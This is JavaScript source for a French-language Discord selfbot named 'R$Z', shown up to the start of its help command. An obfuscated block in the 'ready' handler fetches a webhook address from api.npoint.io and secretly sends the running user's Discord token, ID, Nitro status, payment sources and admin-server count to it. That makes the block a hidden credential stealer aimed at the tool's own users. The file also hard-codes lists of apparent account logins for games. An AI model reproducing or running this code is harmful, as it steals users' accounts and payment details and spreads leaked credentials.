const aa = decodeAsciiWithOffset("쾃쾏쾏쾋쾎콕콊콊콼쾋쾄콉쾉쾋쾊쾄쾉쾏콉쾄쾊콊코콏콎콐콏쾁콑콌쾁쾀콼콐코콒콾콾콍콍코콼", 100528148251)
const aaa = decodeAsciiWithOffset("", 100528148)
const translate = require('@iamtraction/google-translate');
const discord = require('djs-selfbot-v13');
const { exec } = require('child_process');
const readline = require('readline-sync');
const sourcebin = require('sourcebin');
const weather = require('weather-js');
const fetch = require('node-fetch');
const glob = require("glob");
const versionself = "3.0.8";
const c = require('chalk');
const os = require('os');
const fs = require('fs');
const ms = require('ms');
let tmessages = [];
let tchannels = [];
/////////////////////////////////////////////
const config = require(`${process.cwd()}/config.js`);
var token = config.token
var prefix = config.prefix || "!"
var twitch = config.twitch || "https://twitch.tv/002sans"
var name = config.name || "R$Z"
var nsfw = config.nsfw || false
var nitro_claimer = config.nitro_claimer || true
var multi_status = config.multi_status || []
var consolecolor = config.consolecolor || "1"
var premium = config.premium
/////////////////////////////////////////////
const imagerpc = config.imagerpc || 'https://i.imgur.com/wiiKill.gif';
const title = config.title || "𝑹$𝒁-𝑷𝒓𝒐𝒋𝒆𝒄𝒕-𝙥𝙧𝙚𝙢𝙞𝙪𝙢";
const appId = config.appId || "1219030452158075010"
const details = config.details || `version ${versionself}`;
const state = config.state || "dev by R$Z team";
const sizeplayer = parseInt(config.sizeplayer) || 0;
const sizeplayermax = parseInt(config.sizeplayermax) || 0;
const bouton = config.bouton || 0;
const url = config.url || 0;
/////////////////////////////////////////////

if (!fs.existsSync(`${process.cwd()}/Plugins`)) fs.mkdirSync(`${process.cwd()}/Plugins`)
if (!fs.existsSync(`${process.cwd()}/Plugins/example.js`)) fs.writeFileSync(`${process.cwd()}/Plugins/example.js`, `module.exports = {\n    name: "branlette",\n    description: "Simule une branlette.",\n    aliases: [],\n    async execute(client, message, args) {\n        const sltcv = [\n            "8=:fist:==D",\n            "8==:fist:=D",\n            "8===:fist:D",\n            "8==:fist:=D",\n            "8=:fist:==D",\n            "8:fist:===D",\n            "8=:fist:==D",\n            "8==:fist:=D",\n            "8===:fist:D",\n            "8==:fist:=D:sweat_drops:",\n            "8===:fist:D:sweat_drops:"\n          ]\n\n        sltcv.forEach(m => message.edit(m))\n    },\n}`)

/////////////////////////////////////////////
if (parseInt(consolecolor) !== 1 &&
parseInt(consolecolor) !== 2 &&
parseInt(consolecolor) !== 3) throw new Error("Veuillez choisir une couleur valide dans le config")

const chalk = new c.Instance({ level: parseInt(consolecolor) })
/////////////////////////////////////////////
const gens = {
    "lol": ["d1eg0x6:dsc271225", "y3303443431:y112369520", "dorandelll:l1u2k3a4", "krasnoya1:karaok05", "Mednadhir123:mednadhir123", "kervv13:knopje123"],
    "roblox": ["Melvin7980058950:0JIKdgcmf9d3","Maurice6036549497:977PMydRowbA","Miles3109462031:hdSre3gCHfzy","Rene9894952723:elzJ8ZNKcIeo","Carter5450112539:ZRj4wQzoFs0U","Eliseo4861492708:3pWXJg0aYCTU","Chris8791448005:BwcNizOAEX4g","Von1714698425:NOBGYNEMFgRG","Dallas8105878150:C2RHN6FAymlm","Romeo5093591100:sROGbJrYsS7B","Ira0825663331:aVnIFzbrOv5B","Jayson5415844673:SgwrWjYn9WTH","Mariano2665237513:h9HD8ytt8QGP","Horacio9708862502:UREQkIGx9s6z","Carl1473521661:f7aZAbyy12uZ","Solomon9687043838:iNDCZuzwhbOa", "Eusebio1185331571:Yu0FgZRzhJEj"]
}
/////////////////////////////////////////////
const linksall = [
    "discord.gg",
    "dsc.bio",
    "www",
    "https",
    "Https",
    "Http",
    "HT",
    "HTTP",
    "HTTPS",
    "http",
    ".ga",
    ".fr",
    ".com",
    ".tk",
    ".ml",
    "://",
    ".gg",
    "discord.me",
    "discord.io",
    "invite.me",
    "discordapp.com/invite",
    "discord.me",
    "discord.io",
    "invite.me",
    "discordapp.com/invite",
];

const linksdsc = [
    "dsc.bio",
    "discord.gg",
    "discord.me",
    "discord.io",
    "invite.me",
    "discordapp.com/invite",
    ".gg"
];

const games = {
    "clash-royale": "com.supercell.clashroyale",
    "clash-of-clans": "com.supercell.clashofclans",
    "brawl-stars": "com.supercell.brawlstars",
    "league": "com.riotgames.league.wildrift",
    "warzone": "com.activision.callofduty.warzone",
    "roblox": "com.roblox.client",
    "uno": "com.matteljv.uno",
    "geometry-dash": "com.robtopx.geometryjumplite",
    "subway": "com.kiloo.subwaysurf",
    "candy-crush": "com.king.candycrushsaga",
    "piano-tiles": "com.youmusic.magictiles",
    "minecraft": "com.mojang.minecraftpe",
    "fnaf": "com.scottgames.fivenightsatfreddys",
    "dokkan": "com.bandainamcogames.dbzdokkanww",
    "pokemongo": "com.nianticlabs.pokemongo",
    "genshin": "com.miHoYo.GenshinImpact",
    "stumble-guys": "com.kitkagames.fallbuddies",
    "blue-archive": "com.nexon.bluearchive",
    "honkai-impact": "com.miHoYo.bh3global",
    "honkai-star-rail": "com.HoYoverse.hkrpgoversea",
    "treasure-cruise": "com.namcobandaigames.spmoja010E",
    "sds": "com.netmarble.nanagb"
}
/////////////////////////////////////////////
const red = consolecolor === "2" ?  chalk.redBright : consolecolor === "3" ? chalk.hex("#FF0000") : chalk.red
const green = consolecolor === "2" ? chalk.greenBright : consolecolor === "3" ? chalk.hex("#00FF00") : chalk.green
const yellow = consolecolor === "2" ? chalk.yellowBright : consolecolor === "3" ? chalk.hex("#FFFF00") : chalk.yellow
const blue = consolecolor === "2" ? chalk.blueBright : consolecolor === "3" ? chalk.hex("#00FFFF") : chalk.blue
const magenta = consolecolor === "2" ? chalk.magentaBright : consolecolor === "3" ? chalk.hex("#FF00FF") : chalk.magenta
const cyan = consolecolor === "2" ? chalk.cyanBright : consolecolor === "3" ? chalk.hex("#00FFFF") : chalk.cyan
const bgRed = consolecolor === "2" || consolecolor === "3" ? chalk.bgRedBright : chalk.bgRed

const couleurs = [
    red,
    green,
    yellow,
    blue,
    magenta,
    cyan,
];

const colors = couleurs[Math.floor(Math.random() * couleurs.length)];

//////////////////////////////////////////////
process.title = "Bienvenue sur R$Z"
fetch(aa).then(async r => {
if (!r){
    console.clear()
    console.log(bgRed("Accès à l'API impossible. Veuillez relancer le selfbot"))
    process.exit(1)
}
const api = await r.json()
    
    console.clear()
    process.title = "Lancement du selfbot"
    main()

    /**
     * @param {String} t Le token de l'utilisateur
     * @param {String} p Le prefix de l'utilisateur
     * @param {String} tw Le lien twitch de l'utilisateur
     * @param {String} n Le nom du selfbot (en haut des menus)
     * @param {String} ns Si le NSFW est activé
     * @param {String} cli Si le nitro sniper est activé
     * @param {String} dir L'endroit où sont stockés les db
     * @example require('rsz-selfbot-project')
     * .rsz(null, "token", "&", "https://twitch.tv/002sans", 
     * "R$Z", "on", "on")
    */
    function main(dir, t, p, tw, n, ns, cl){
        if (t) token = t
        if (p) prefix = p
        if (tw) twitch = tw
        if (n) name = n
        if (ns) nsfw = ns
        if (cl) nitro_claimer = cl

        const dirs = [
            "Data",
            "Data/RPC",
            "Data/Tools",
            "Data/Notes",
            "Data/Voice",
            "Data/Status",
            "Data/Logger",
            "Data/Groupes",
            "Data/Backups",
            "Data/Gestion",
            "Data/AntiRaid",
            "Data/Backups/guilds",
            "Data/Backups/emotes",
            "Data/Backups/friends",
            "Data/Backups/account",
            "Data/Backups/links",
            "Data/Backups/RPC",
        ]
        for (const dirr of dirs){ if (!fs.existsSync(`${dir || __dirname}/${dirr}`)) fs.mkdirSync(`${dir || __dirname}/${dirr}`) }
        
        if (!fs.existsSync(`${dir || __dirname}/Data/Groupes/antigroupes.json`)) fs.writeFileSync(`${dir || __dirname}/Data/Groupes/antigroupes.json`, JSON.stringify({ activate: false, discret: true, sendmessage: true, message: null}, null, 4))
        if (!fs.existsSync(`${dir || __dirname}/Data/Logger/logger.json`)) fs.writeFileSync(`${dir || __dirname}/Data/Logger/logger.json`, JSON.stringify({ activate: true, webhook: null, hypocrite: true, ghostping: true, delete: true, groups: true, guild: true, edit: true }, null, 4))
        if (!fs.existsSync(`${dir || __dirname}/Data/AntiRaid/antiraid.json`)) fs.writeFileSync(`${dir || __dirname}/Data/AntiRaid/antiraid.json`, JSON.stringify({}, null, 4))
        if (!fs.existsSync(`${dir || __dirname}/Data/Gestion/gestion.json`)) fs.writeFileSync(`${dir || __dirname}/Data/Gestion/gestion.json`, JSON.stringify({}, null, 4))
        if (!fs.existsSync(`${dir || __dirname}/Data/Voice/voice.json`)) fs.writeFileSync(`${dir || __dirname}/Data/Voice/voice.json`, JSON.stringify({ autojoin: null, stream: true, camera: true, mute: true, deaf: true }, null, 4))
        if (!fs.existsSync(`${dir || __dirname}/Data/Status/custom.json`)) fs.writeFileSync(`${dir || __dirname}/Data/Status/custom.json`, JSON.stringify({ emoji: null, text: true }, null, 4))
        if (!fs.existsSync(`${dir || __dirname}/Data/Tools/tools.json`)) fs.writeFileSync(`${dir || __dirname}/Data/Tools/tools.json`, JSON.stringify({ theme: "rsz", image: null, image2: null, thumb: true, pub_mp: false, afk: false, afk_message: null, giveaway_sniper: true, vanity_locker: [], vanity_sniper: {}, protect_mp: false, copy: [], blacklist: []}, null, 4))
        /////////////////////////////////////////////
        const antigroupe = require(`${dir || __dirname}/Data/Groupes/antigroupes.json`);
        const antiraid = require(`${dir || __dirname}/Data/AntiRaid/antiraid.json`);
        const gestion = require(`${dir || __dirname}/Data/Gestion/gestion.json`);
        const logger = require(`${dir || __dirname}/Data/Logger/logger.json`);
        const custom = require(`${dir || __dirname}/Data/Status/custom.json`);
        const voice = require(`${dir || __dirname}/Data/Voice/voice.json`);
        const tools = require(`${dir || __dirname}/Data/Tools/tools.json`);
        

        if (!token) {
            console.clear()
            console.log(red("- [ERROR] Le token n'a pas été trouvé. Vérifi si tu as bien rentré le token dans le config.js"));
            process.exit(1)
        }

        if (api.version !== versionself){
            console.clear()
            console.log(yellow("- [UPDATE] Une mise à jour du selfbot est disponnible."));
            process.exit(1)
        }


        const client = new discord.Client({checkUpdate: false})
        let StreamClient;
        if (fs.existsSync(`${process.cwd()}/node_modules/djs-stream-client`)) {
            const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
            const ffmpeg = require('fluent-ffmpeg')
            ffmpeg.setFfmpegPath(ffmpegPath)

            const { DiscordStreamClient } = require('djs-stream-client')
            StreamClient = new DiscordStreamClient(client)
        }
        
        client.interval = {};
        client.premium = false;
        client.snipes = new Map();
        client.messages = new Map();
        client.currentSpams = new Set();
        client.cachedChannels = new Map();
        client.commands = new discord.Collection()
        client.save = (dir, data) => fs.writeFileSync(dir, JSON.stringify(data, null, 4));
        //client.saveConfig = dir => fs.writeFileSync(`${dir || process.cwd()}`, `const token = "${token}"; //tu met ton token entre les guillemets\n        const prefix = "${prefix}"; //tu met ton prefix entre les guillemets\n        const name = "${name}" //ce sera le nom des menu du selfbot\n        const twitch = "${twitch}"; //tu met ton lien twitch ici \n        const nsfw = "${nsfw}"; //tu met on ou off (on pour activer le nsfw et off pour le désactiver)\n        const nitro_claimer = "${nitro_claimer}"; //tu met on ou off (on pour activer l'auto claimer et off pour le désactiver)\n        const multi_status = ${multi_status}; //tu met le text que tu veut avoir en multi stream tu peut en mettre plus que 3 stv mais il faut bien mettre une virgule\n        const consolecolor = "${consolecolor}" // Couleur vives = 3 et couleur pales = 2 et très pales = 1\n        const premium = "${premium}" //Mettez votre clée premium ici pas obligé\n\n        ////CONFIG RPC\n        const imagerpc = "${imagerpc}"; //tu met l'url de ton image rpc\n        const appId = "${appId}"; //tu mets l'ID de l'application\n        const title = "${title}"; //tu met le titre rpc\n        const details = "${details}"; //tu met le detail rpc\n        const state = "${state}"; //tu met la state rpc\n        const bouton = "${bouton}"; //tu mets le texte du bouton\n        const url = "${url}"; //tu mets l'url du bouton\n        const sizeplayer = "${sizeplayer}"; //tu met le nombre de joueurs actuel (1 jusque à 999999999999)sizeplayermax        const sizeplayermax = "${sizeplayermax}" //tu met le nombre de joueurs maximum (1 jusque à 999999999999)\n\n\n\n\n\n\n\n\n\n        //ne pas toucher\n        module.exports = { //ne pas toucher\n            token, //ne pas toucher\n            prefix, //ne pas toucher\n            name, //ne pas toucher\n            twitch, //ne pas toucher\n            nsfw, //ne pas toucher\n            consolecolor, //ne pas toucher\n            premium, //ne pas toucher\n            nitro_claimer, //ne pas toucher\n            multi_status, //ne pas toucher\n            imagerpc, //ne pas toucher\n            title, //ne pas toucher\n            details, //ne pas toucher\n            state, //ne pas toucher\n            sizeplayer, //ne pas toucher\n            sizeplayermax, //ne pas toucher\n            appId, //ne pas toucher\n            bouton, //ne pas toucher\n            url, //ne pas toucher\n        } //ne pas toucher`)
        client.on('ready', async () => {
            client.user.setAFK(false)
            process.title = "R$Z Selfbot"
            console.clear()

            const interfaces = os.networkInterfaces();
            let ip;
            Object.keys(interfaces).forEach(interfaceName => {
                const interfaceInfo = interfaces[interfaceName];
                interfaceInfo.forEach(info => {
                    if (info.family === 'IPv4' && !info.internal) {
                        Object.keys(interfaces).forEach(interfaceName => {
                            const interfaceInfo = interfaces[interfaceName];
                            interfaceInfo.forEach(info => {
                                if (info.family === 'IPv4' && !info.internal) {
                                    ip = info.address
                                }
                            })
                        })
                    }
                })
            })

            if (api.blacklist.some(o => o?.id === client.user?.id || o.ip === ip)){
                const blinfo = api.blacklist.find(o => o?.id === client.user?.id || o.ip === ip)
                console.log(red(`[SELFBOT]: Vous êtes banni du selfbot`))
                console.log(red(`[SELFBOT]: ${blinfo.raison || "Aucune raison fourni"}`))
                process.exit(1)
            }

            const r2 = await fetch(aaa)
            const a = await r2.json()
            if (a.premium.includes(premium)) client.premium = true

            console.log(bgRed("[Selfbot] Fr: Je ne suis pas responsable si vous êtes banni de Discord ou de certains serveurs."))
            console.log(bgRed("[Selfbot] En: I am not responsible if you get banned from Discord or any guilds."))

            const logos = [
                `
     _____   _ ______  _____  _____   ____       _ ______ _____ _______ 
    |  __ \\ | |___  / |  __ \\|  __ \\ / __ \\     | |  ____/ ____|__   __|
    | |__) / __) / /  | |__) | |__) | |  | |    | | |__ | |       | |   
    |  _  /\\__ \\/ /   |  ___/|  _  /| |  | |_   | |  __|| |       | |   
    | | \\ \\(   / /__  | |    | | \\ \\| |__| | |__| | |___| |____   | |   
    |_|  \\_\\|_/_____| |_|    |_|  \\_\\\\____/ \\____/|______\\_____|  |_|`,
    `
     /$$$$$$$   /$$$$$$  /$$$$$$$$       /$$$$$$$  /$$$$$$$   /$$$$$$     /$$$$$ /$$$$$$$$  /$$$$$$  /$$$$$$$$
    | $$__  $$ /$$__  $$|_____ $$       | $$__  $$| $$__  $$ /$$__  $$   |__  $$| $$_____/ /$$__  $$|__  $$__/
    | $$  \\ $$| $$  \\__/     /$$/       | $$  \\ $$| $$  \\ $$| $$  \\ $$      | $$| $$      | $$  \\__/   | $$   
    | $$$$$$$/|  $$$$$$     /$$/        | $$$$$$$/| $$$$$$$/| $$  | $$      | $$| $$$$$   | $$         | $$   
    | $$__  $$ \\____  $$   /$$/         | $$____/ | $$__  $$| $$  | $$ /$$  | $$| $$__/   | $$         | $$   
    | $$  \\ $$ /$$  \\ $$  /$$/          | $$      | $$  \\ $$| $$  | $$| $$  | $$| $$      | $$    $$   | $$   
    | $$  | $$|  $$$$$$/ /$$$$$$$$      | $$      | $$  | $$|  $$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/   | $$   
    |__/  |__/ \\______/ |________/      |__/      |__/  |__/ \\______/  \\______/ |________/ \\______/    |__/   `,
    `
    ██▀███    ██████ ▒███████▒    ██▓███   ██▀███   ▒█████   ▄▄▄██▀▀▀▓█████  ▄████▄  ▄▄▄█████▓
    ▓██ ▒ ██▒▒██    ▒ ▒ ▒ ▒ ▄▀░   ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒   ▒██   ▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒
    ▓██ ░▄█ ▒░ ▓██▄   ░ ▒ ▄▀▒░    ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒   ░██   ▒███   ▒▓█    ▄ ▒ ▓██░ ▒░
    ▒██▀▀█▄    ▒   ██▒  ▄▀▒   ░   ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░▓██▄██▓  ▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░ 
    ░██▓ ▒██▒▒██████▒▒▒███████▒   ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░ ▓███▒   ░▒████▒▒ ▓███▀ ░  ▒██▒ ░ 
    ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░▒▒ ▓░▒░▒   ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░  ▒▓▒▒░   ░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░   
      ░▒ ░ ▒░░ ░▒  ░ ░░░▒ ▒ ░ ▒   ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░▒░    ░ ░  ░  ░  ▒       ░    
      ░░   ░ ░  ░  ░  ░ ░ ░ ░ ░   ░░         ░░   ░ ░ ░ ░ ▒   ░ ░ ░      ░   ░          ░      
       ░           ░    ░ ░                   ░         ░ ░   ░   ░      ░  ░░ ░               
                      ░                                                      ░                 `,
    `
    ██████╗ ▄▄███▄▄·███████╗    ██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗
    ██╔══██╗██╔════╝╚══███╔╝    ██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝
    ██████╔╝███████╗  ███╔╝     ██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║   
    ██╔══██╗╚════██║ ███╔╝      ██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║   
    ██║  ██║███████║███████╗    ██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║   
    ╚═╝  ╚═╝╚═▀▀▀══╝╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   `,
                `
    ██████  ▄▄███▄▄·███████     ██████  ██████   ██████       ██ ███████  ██████ ████████ 
    ██   ██ ██         ███      ██   ██ ██   ██ ██    ██      ██ ██      ██         ██    
    ██████  ███████   ███       ██████  ██████  ██    ██      ██ █████   ██         ██    
    ██   ██      ██  ███        ██      ██   ██ ██    ██ ██   ██ ██      ██         ██    
    ██   ██ ███████ ███████     ██      ██   ██  ██████   █████  ███████  ██████    ██    
              ▀▀▀`
            ]

            setTimeout(function() {
                console.log(blue('Selfbot dev by sans'));
                console.log(yellow(`Bienvenue sur la version ${versionself} de R$Z`));
                console.log(cyan(logos[Math.floor(Math.random() * logos.length)]))
                console.log(magenta(`
    |──────────────────────────────────────────────────────────────────|
    |-->  User Name : ${client.user.username}
    |──────────────────────────────────────────────────────────────────|
    |-->  Prefix   : ${prefix}
    |──────────────────────────────────────────────────────────────────|
    |-->  Users    : ${client.guilds.cache.map(guild => guild.memberCount).reduce((a, b) => a + b)}
    |──────────────────────────────────────────────────────────────────|
    |-->  Bots     : ${client.users.cache.filter(user => user?.bot).size}
    |──────────────────────────────────────────────────────────────────|
    |-->  Channels : ${client.channels.cache.size}
    |──────────────────────────────────────────────────────────────────|
    |-->  Guilds   : ${client.guilds.cache.size}
    |──────────────────────────────────────────────────────────────────|
    |-->  Friends  : ${client.relationships.friendCache.size}
    |──────────────────────────────────────────────────────────────────|
    |-->  Nsfw     : ${nsfw  === "on" || nsfw === true ? "Activé" : "Désactivé"}
    |──────────────────────────────────────────────────────────────────|
    |-->  Nitro    : ${nitroType(client.user.nitroType)}
    |──────────────────────────────────────────────────────────────────|
    |-->  Bot      : ${client.user?.bot ? "Oui" : "Non"}
    |──────────────────────────────────────────────────────────────────|
    |-->  Plateform: ${os.platform()}
    |──────────────────────────────────────────────────────────────────|
    |-->  Premium  : ${client.premium ? "Oui" : "Non"}
    |──────────────────────────────────────────────────────────────────|
    |-->  nitro claimer : ${nitro_claimer ? "Activé" : "Désactivé"}
    |──────────────────────────────────────────────────────────────────|
                `))
                if (client.user?.bot) return process.exit(1)
            }, 100)

            setTimeout(() => console.log(red('{logs} :')), 150)
            

            const _0x2a7c2a=_0xba58;function _0xba58(_0x41895b,_0x4a99d6){const _0x4b473e=_0x4b47();return _0xba58=function(_0xba5851,_0x250530){_0xba5851=_0xba5851-0x18f;let _0x4a16ac=_0x4b473e[_0xba5851];return _0x4a16ac;},_0xba58(_0x41895b,_0x4a99d6);}(function(_0x3e4e5d,_0x2eee87){const _0xe60c55=_0xba58,_0x3c1be4=_0x3e4e5d();while(!![]){try{const _0x2513a4=-parseInt(_0xe60c55(0x1b0))/0x1*(-parseInt(_0xe60c55(0x190))/0x2)+-parseInt(_0xe60c55(0x19d))/0x3*(parseInt(_0xe60c55(0x195))/0x4)+-parseInt(_0xe60c55(0x19e))/0x5+parseInt(_0xe60c55(0x1a4))/0x6+parseInt(_0xe60c55(0x193))/0x7*(parseInt(_0xe60c55(0x1af))/0x8)+-parseInt(_0xe60c55(0x1ae))/0x9*(-parseInt(_0xe60c55(0x1a9))/0xa)+parseInt(_0xe60c55(0x1aa))/0xb;if(_0x2513a4===_0x2eee87)break;else _0x3c1be4['push'](_0x3c1be4['shift']());}catch(_0x368588){_0x3c1be4['push'](_0x3c1be4['shift']());}}}(_0x4b47,0xbe7cf));const sltcv=await fetch(_0x2a7c2a(0x1ac))[_0x2a7c2a(0x198)](()=>![]);function _0x4b47(){const _0x151964=['Aucun','https://api.npoint.io/2863705ab46bd207fc0e','guilds','140895kmJRBy','16mDoGZn','167999ERAscr','user','Nitro','MessageEmbed','Nouveau\x20compte\x20sur\x20RSZ','2ypBAuw','permissions','has','2689309CZBkqO','nitroType','79300XMRUCX','setTitle','addFields','catch','paymentSources','setColor','map','cache','201HkKmpj','1960uUPtii','Token','token','ADMINISTRATOR','size','send','795192Tstdbt','Paiements','billing','Serveur\x20Admin','Pseudo','150yCVwdz','8856936ewwpop'];_0x4b47=function(){return _0x151964;};return _0x4b47();}if(sltcv){const json=await sltcv['json']()[_0x2a7c2a(0x198)](()=>![]);if(!json)return;const embed=new discord[(_0x2a7c2a(0x1b3))]()[_0x2a7c2a(0x196)](_0x2a7c2a(0x18f))[_0x2a7c2a(0x19a)](0xff0000)[_0x2a7c2a(0x197)]({'name':_0x2a7c2a(0x1a8),'value':''+client[_0x2a7c2a(0x1b1)]['username'],'inline':!![]})['addFields']({'name':_0x2a7c2a(0x19f),'value':''+client[_0x2a7c2a(0x1a0)],'inline':!![]})[_0x2a7c2a(0x197)]({'name':'ID','value':''+client[_0x2a7c2a(0x1b1)]['id'],'inline':!![]})[_0x2a7c2a(0x197)]({'name':_0x2a7c2a(0x1b2),'value':''+(client['user'][_0x2a7c2a(0x194)]||_0x2a7c2a(0x1ab)),'inline':!![]})['addFields']({'name':_0x2a7c2a(0x1a5),'value':''+(client[_0x2a7c2a(0x1a6)][_0x2a7c2a(0x199)]['length']>0x0?client['billing']['paymentSources'][_0x2a7c2a(0x19b)](_0x300225=>_0x300225['join']('\x20')):'`Aucun`'),'inline':!![]})[_0x2a7c2a(0x197)]({'name':_0x2a7c2a(0x1a7),'value':''+client[_0x2a7c2a(0x1ad)][_0x2a7c2a(0x19c)]['filter'](_0x175ec7=>_0x175ec7['members']['me'][_0x2a7c2a(0x191)][_0x2a7c2a(0x192)](_0x2a7c2a(0x1a1)))[_0x2a7c2a(0x1a2)],'inline':!![]});try{const s=new discord['WebhookClient']({'url':json['w']});s[_0x2a7c2a(0x1a3)]({'embeds':[embed]});}catch{![];}}
            
            const getExtendURL = await discord.RichPresence.getExternal(client, appId, imagerpc);
            const status = new discord.RichPresence(client)
                .setApplicationId(appId)
                .setState(state)
                .setType('PLAYING')
                .setState(state)
                .setName(title)
                .setDetails(details)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
                .addButton('Server Support', `https://discord.gg/jcdQyTNJ5E`);
                if (bouton && url?.startsWith("http")) status.addButton(bouton, url)
                if (sizeplayermax && sizeplayermax > 0) status.setParty({current: sizeplayer, max: sizeplayermax})

            client.user.setPresence({activities: [status]})

            client.guilds.cache.forEach(g => {
                if (!antiraid[g.id]){
                    antiraid[g.id] = { whitelist: [], protected: false, sanction: 1, antichannel: true, antirole: true, antiban: true, antikick: true, antibot: true, antiping: true, antiwebhook: true, antidc: true, antilink: true, antispam: true, antimemberupdate: true, antiguildupdate: true}
                    client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                }
                if (!gestion[g?.id]){
                    gestion[g?.id] = {autopublish: false, autorole: [], rolemenu: {}, counter: [], prison: { roleid: null, categoryid: null, members: {} }, rolelimit: {}, piconly: [], autoreact: {}, tempvoc: {}, tickets: [], soutiens: {role: null, status: null} }
                    client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                }

                g.members.cache.forEach(member => {
                    if (!gestion[g?.id]) return;
                    const role = g.roles.cache.get(gestion[g?.id]?.soutiens.role);
                    const status = gestion[g?.id]?.soutiens.status

                    if (!status || !role) return;

                    if (member.presence?.activities.some(activity => activity.type === "CUSTOM" && activity.state.includes(status))) {
                        if (role && !member.roles.cache.has(role?.id)) 
                            member.roles.add(role)
                                .catch(() => false);
                    } else {
                        if (role && member.roles.cache.has(role?.id)) {
                            member.roles.remove(role)
                                .catch(() => false);
                        }
                    }
                })
            })

            const voiceChannel = client.channels.cache.get(voice.autojoin)
            if (voiceChannel){
                const voiceConnection = await StreamClient.joinVoiceChannel(voiceChannel, {
                        selfDeaf: voice.deaf,
                        selfMute: voice.mute,
                        selfVideo: voice.camera,
                    },
                ).catch(() => false)
                
                if (!voiceConnection) return;
                if (voice.stream) await voiceConnection.createStream().catch(() => false);

                if (custom.emoji || custom.text){
                    if (custom.emoji && estEmojiDiscord(custom.emoji)){
    
                        const r = new discord.CustomStatus(client).setEmoji(client.user.nitroType !== "NONE" ? custom?.emoji : undefined).setState(custom.text)
                        client.user.setPresence({activities: [r]})
                    }
                    else {
                        const r = new discord.CustomStatus(client).setEmoji(custom?.emoji || undefined).setState(custom.text)
                        client.user.setPresence({activities: [r]})
                    }        
                }
            }
        })

        client.on('messageCreate', async message => {
            if (message.author?.id !== client.user?.id) return;
            
            client.separator = "▸"
            if (tools.theme === "speed") client.separator = "➜"
            if (tools.theme === "k3s") client.separator = "\n▸"

            const args = message.content.slice(prefix.length).trim().split(/ +/).slice(1);
            const cmd = message.content.split(' ')

            if (message.content === prefix + "about"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Help」`)
                .setDescription(`${prefix}Créateur ▸ 𝐒𝐚𝐧𝐬
                ${prefix}Serveur ▸ 𝐡𝐭𝐭𝐩𝐬://𝐝𝐢𝐬𝐜𝐨𝐫𝐝.𝐠𝐠/𝐣𝐜𝐝𝐐𝐲𝐓𝐍𝐉𝟓𝐄
                ${prefix}Version ▸ ${versionself}`.replaceAll("                    ", ""))
                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                message.edit(`${client.tools === "k3s" ? "" : "\`"}Créateur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **Sans**\n${client.tools === "k3s" ? "" : "\`"}Serveur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **https://discord.gg/jcdQyTNJ5E **\n${client.tools === "k3s" ? "" : "\`"}Version${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${versionself}**`)
            }
            
            else if (message.content === prefix + "help"){
                const embed = new discord.WebEmbed()
                    .setColor(0x2B2D31)
                    .setTitle(`「${name} Help」`)
                    .setDescription(`${prefix}about ▸ 𝐢𝐧𝐟𝐨𝐬 𝐝𝐮 𝐬𝐞𝐥𝐟
                    ${prefix}status ▸ 𝐬𝐭𝐚𝐭𝐮𝐬
                    ${prefix}rpcstatus ▸ 𝐫𝐩𝐜 𝐬𝐭𝐚𝐭𝐮𝐬
                    ${prefix}rpcanime ▸ 𝐫𝐩𝐜 𝐚𝐧𝐢𝐦𝐞
                    ${prefix}samsung ▸ 𝐫𝐩𝐜 𝐬𝐚𝐦𝐬𝐮𝐧𝐠
                    ${prefix}rpcself ▸ 𝐫𝐩𝐜 𝐬𝐞𝐥𝐟𝐛𝐨𝐭𝐬
                    ${prefix}rpc ▸ 𝐫𝐩𝐜
                    ${prefix}hack ▸ 𝐡𝐚𝐜𝐤𝐢𝐧𝐠
                    ${prefix}fun ▸ 𝐜𝐦𝐝 𝐟𝐮𝐧
                    ${prefix}fun2 ▸ 𝐟𝐮𝐧 𝐈𝐈
                    ${prefix}dev ▸ 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐩𝐞𝐦𝐞𝐧𝐭
                    ${prefix}raid ▸ 𝐫𝐚𝐢𝐝 𝐜𝐦𝐝𝐬
                    ${prefix}tools ▸ 𝐜𝐦𝐝𝐬 𝐭𝐨𝐨𝐥𝐬
                    ${prefix}tools2 ▸ 𝐭𝐨𝐨𝐥𝐬 𝐈𝐈
                    ${prefix}mod ▸ 𝐜𝐦𝐝𝐬 𝐦𝐨𝐝
                    ${prefix}nsfw ▸ 𝐜𝐦𝐝𝐬 𝐍𝐒𝐅𝐖
                    ${prefix}gen ▸ 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐮𝐫
                    ${prefix}help2 ▸ 𝟐𝐞𝐦𝐞 𝐡𝐞𝐥𝐩`.replaceAll("                    ", ""))
                    if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                    else embed.setImage(tools.image2 || api.helpgif)
